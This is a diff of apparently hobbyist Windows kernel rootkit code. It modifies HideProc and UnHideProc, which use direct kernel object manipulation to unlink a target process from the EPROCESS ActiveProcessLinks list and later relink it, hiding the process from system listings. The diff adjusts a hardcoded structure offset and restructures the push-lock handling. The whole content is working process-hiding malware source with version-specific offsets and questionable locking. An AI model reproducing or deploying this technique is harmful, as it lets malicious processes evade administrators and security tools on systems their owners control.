@@ -85,7 +85,7 @@ int Globals_FindProcess(_In_ Globals* g_state,_In_ ULONG pid) {
 NTSTATUS HideProc(_In_ ULONG pid,_Out_ ULONG_PTR* ListEntry) {
 	PEPROCESS targetProcess;
 	NTSTATUS status = STATUS_SUCCESS; 
-	ULONG activeProcLinkOffset = 0x1e8;
+	ULONG activeProcLinkOffset = 0x1d8;
 	ULONG ProcLockOffset = 0x1c8;
 
 	// to change this function using KPCR structure
@@ -99,14 +99,32 @@ NTSTATUS HideProc(_In_ ULONG pid,_Out_ ULONG_PTR* ListEntry) {
 	*ListEntry =(ULONG_PTR) processListEntry;
 	
 	PEX_PUSH_LOCK ProcLock = (PEX_PUSH_LOCK)((ULONG_PTR)targetProcess + ProcLockOffset);
-	ExAcquirePushLockExclusiveEx(ProcLock, 0);
-
+	
 	PLIST_ENTRY prev = processListEntry->Blink;
 	PLIST_ENTRY next = processListEntry->Flink;
 
-	prev->Flink = next; 
-	next->Blink = prev; 
+	//Im changing fields in prev and next, so maybe I should take the lock of the EPROC structure
+	EPROCESS* prevProcess = CONTAINING_RECORD(prev, EPROCESS, ActiveProcessLinks);
+	EPROCESS* nextProcess = CONTAINING_RECORD(next, EPROCESS, ActiveProcessLinks);
 
+	PEX_PUSH_LOCK prevLock = (PEX_PUSH_LOCK)((ULONG_PTR)prevProcess + ProcLockOffset);
+	ExAcquirePushLockExclusiveEx(prevLock, 0);
+	
+	if (prev) {
+		prev->Flink = next;
+	}
+	ExReleasePushLockExclusive(prevLock);
+
+	PEX_PUSH_LOCK nextLock = (PEX_PUSH_LOCK)((ULONG_PTR)nextProcess + ProcLockOffset);
+	ExAcquirePushLockExclusiveEx(nextLock, 0);
+
+	if (next) {
+		next->Blink = prev;
+	}
+	ExReleasePushLockExclusive(nextLock);
+
+
+	ExAcquirePushLockExclusiveEx(ProcLock, 0);
 	//to avoid BSOD
 	processListEntry->Blink = (PLIST_ENTRY)&processListEntry->Flink;
 	processListEntry->Flink = (PLIST_ENTRY)&processListEntry->Flink;
@@ -119,7 +137,7 @@ NTSTATUS HideProc(_In_ ULONG pid,_Out_ ULONG_PTR* ListEntry) {
 NTSTATUS UnHideProc(_In_ Globals* g_state, ULONG index) {
 	PEPROCESS systemProcess; 
 	NTSTATUS status = STATUS_SUCCESS;
-	ULONG activeProcLinkOffset = 0x1e8;
+	ULONG activeProcLinkOffset = 0x1d8;
 	ULONG ProcLockOffset = 0x1c8;
 
 	status = PsLookupProcessByProcessId(UlongToHandle(SYSTEM_PROCESS_PID), &systemProcess);
@@ -128,18 +146,33 @@ NTSTATUS UnHideProc(_In_ Globals* g_state, ULONG index) {
 	}
 
 	PLIST_ENTRY systemListEntry = (PLIST_ENTRY)((ULONG_PTR)systemProcess + activeProcLinkOffset);
-	PEX_PUSH_LOCK ProcLock = (PEX_PUSH_LOCK)((ULONG_PTR)systemProcess + ProcLockOffset);
-	
-	ExAcquirePushLockExclusiveEx(ProcLock, 0);
+	PEX_PUSH_LOCK SystemLock = (PEX_PUSH_LOCK)((ULONG_PTR)systemProcess + ProcLockOffset);
 	
 	PLIST_ENTRY next = systemListEntry->Flink;
 	PLIST_ENTRY current = (PLIST_ENTRY)g_state->ListEntry[index];
-	current->Blink = systemListEntry;
-	current->Flink = next; 
-	next->Blink = current; 
+
+	EPROCESS* currentProcess = CONTAINING_RECORD(current, EPROCESS, ActiveProcessLinks);
+	EPROCESS* nextProcess = CONTAINING_RECORD(next, EPROCESS, ActiveProcessLinks);
+	PEX_PUSH_LOCK currentLock = (PEX_PUSH_LOCK)((ULONG_PTR)currentProcess + ProcLockOffset);
+	PEX_PUSH_LOCK nextLock = (PEX_PUSH_LOCK)((ULONG_PTR)nextProcess + ProcLockOffset);
+
+	ExAcquirePushLockExclusiveEx(SystemLock, 0);	
+	
 	systemListEntry->Flink = current;
 
-	ExReleasePushLockExclusive(ProcLock);
+	ExReleasePushLockExclusive(SystemLock);
+	
+	ExAcquirePushLockExclusiveEx(currentLock, 0);
+	current->Blink = systemListEntry;
+	current->Flink = next;
+	ExReleasePushLockExclusive(currentLock);
+
+	ExAcquirePushLockExclusiveEx(nextLock, 0);
+
+	next->Blink = current;
+
+	ExReleasePushLockExclusive(nextLock);
+
 	ObDereferenceObject(systemProcess);
 	return status; 
 }
